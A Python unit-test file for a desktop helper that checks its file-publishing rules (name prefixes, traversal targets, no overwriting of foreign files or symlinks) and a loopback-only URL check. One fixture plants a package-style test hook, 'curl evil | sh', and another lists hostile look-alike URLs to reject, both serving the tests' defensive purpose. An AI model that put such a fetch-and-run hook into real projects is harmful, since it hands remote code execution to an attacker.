#!/usr/bin/env python3
# SPDX-License-Identifier: CC-BY-NC-4.0
# Copyright (c) 2026 Marc-André Léger
"""Unit tests of the helper's 1.9.2 publish rules (NV-060) and the loopback-only source hook (NV-091), standard library only.

    python3 -m unittest discover -s desktop/tests -p "test_*.py"
"""
import json
import os
import sys
import tempfile
import unittest
from unittest import mock

APP = os.path.abspath(os.environ.get("CRG_APP_DIR") or os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "app"))
_TMP = tempfile.mkdtemp(prefix="crg-publish-")
os.environ.setdefault("CRG_FEEDS_DIR", os.path.join(_TMP, "feeds"))
os.environ.setdefault("CRG_KEYS_DIR", os.path.join(_TMP, "keys"))
os.environ.setdefault("CRG_KEYS_BACKEND", "file")
sys.path.insert(0, APP)
import crg_feeds  # noqa: E402
import serve  # noqa: E402


class PublishRules(unittest.TestCase):
    def setUp(self):
        self.shared = tempfile.mkdtemp(prefix="crg-shared-")
        self.feeds = tempfile.mkdtemp(prefix="crg-feeds-")
        self._feeds = serve.FEEDS
        serve.FEEDS = self.feeds
        self._cfg = crg_feeds.load_config
        crg_feeds.load_config = lambda _d: {"links": {"registry_local_dir": self.shared}}
        self._folder = serve.registry_folder
        serve.registry_folder = lambda where: self.shared

    def tearDown(self):
        serve.FEEDS = self._feeds
        crg_feeds.load_config = self._cfg
        serve.registry_folder = self._folder

    def test_prefixes_and_targets(self):
        out = serve.publish("crg-registry-anon-2026-11-08.json", '{"schema":"crg-registry/1"}', "registry")
        self.assertTrue(os.path.isfile(out["path"]) and out["replaced"] is False)
        for bad in ("claude_desktop_config.json", "package.json", "settings.json", "config.json", "report.csv", "notes.md"):
            with self.assertRaises(ValueError, msg=bad):
                serve.publish(bad, "{}", "registry")
            self.assertFalse(os.path.exists(os.path.join(self.shared, bad)))
        with self.assertRaises(ValueError):
            serve.publish("crg-registry-x.json", "{}", "briefing")          # a registry name is not a briefing
        with self.assertRaises(ValueError):
            serve.publish("t.json", "{}", "../../x")                       # unknown target: no fallback to the outbox
        self.assertFalse(os.path.exists(os.path.join(self.feeds, "registry-outbox", "t.json")))
        brief = serve.publish("briefing-2026-11-08.md", "# Weekly threat briefing\n", "briefing")
        self.assertTrue(brief["path"].startswith(os.path.join(self.feeds, "briefings")))

    def test_never_overwrites_foreign_files(self):
        foreign = os.path.join(self.shared, "crg-registry-foreign.json")
        with open(foreign, "w", encoding="utf-8") as fh:
            fh.write('{"scripts": {"test": "curl evil | sh"}}')
        with self.assertRaises(ValueError):
            serve.publish("crg-registry-foreign.json", '{"schema":"crg-registry/1"}', "registry")
        with open(foreign, encoding="utf-8") as fh:
            self.assertIn("curl evil", fh.read())
        link = os.path.join(self.shared, "crg-registry-link.md")
        os.symlink(foreign, link)
        with self.assertRaises(ValueError):
            serve.publish("crg-registry-link.md", "# Risk registry", "registry")
        self.assertTrue(os.path.islink(link))

    def test_replaces_its_own_files_only(self):
        a = serve.publish("crg-registry2-contribution-anon-x.json", '{"schema":"crg-registry/2"}', "registry")
        b = serve.publish("crg-registry2-contribution-anon-x.json", '{"schema":"crg-registry/2","v":2}', "registry")
        self.assertEqual(a["path"], b["path"]) and self.assertTrue(b["replaced"])
        with open(os.path.join(self.feeds, "published.json"), encoding="utf-8") as fh:
            rec = json.load(fh)
        self.assertIn(a["path"], rec["files"])
        # a file of ours from an earlier release (no record) is recognised by its content
        legacy = os.path.join(self.shared, "crg-registry-legacy.md")
        with open(legacy, "w", encoding="utf-8") as fh:
            fh.write("# Risk registry — Organization A\n")
        self.assertTrue(serve.publish("crg-registry-legacy.md", "# Risk registry — Organization A\n\nnew", "registry")["replaced"])
        self.assertNotIn("published.json", [f["name"] for f in serve.list_files()])


class SourcesBase(unittest.TestCase):
    def test_loopback_only(self):
        for ok in ("http://127.0.0.1:8303", "http://localhost:9/", "http://[::1]:8000"):
            with mock.patch.dict(os.environ, {"CRG_SOURCES_BASE": ok, "CRG_FEED_BASE": ""}):
                self.assertEqual(serve._sources_base(), ok.rstrip("/"))
                self.assertEqual(crg_feeds._sources_base(), ok.rstrip("/"))
        for bad in ("https://evil.example", "http://127.0.0.1.evil.example/", "http://localhost@evil.example/", "ftp://127.0.0.1/"):
            with mock.patch.dict(os.environ, {"CRG_SOURCES_BASE": bad, "CRG_FEED_BASE": ""}):
                self.assertIsNone(serve._sources_base(), bad)
                self.assertIsNone(crg_feeds._sources_base(), bad)
        with mock.patch.dict(os.environ, {"CRG_SOURCES_BASE": "", "CRG_FEED_BASE": "http://127.0.0.1:8303/"}):
            self.assertEqual(serve._sources_base(), "http://127.0.0.1:8303")   # the older name still works, same rule


if __name__ == "__main__":
    unittest.main()
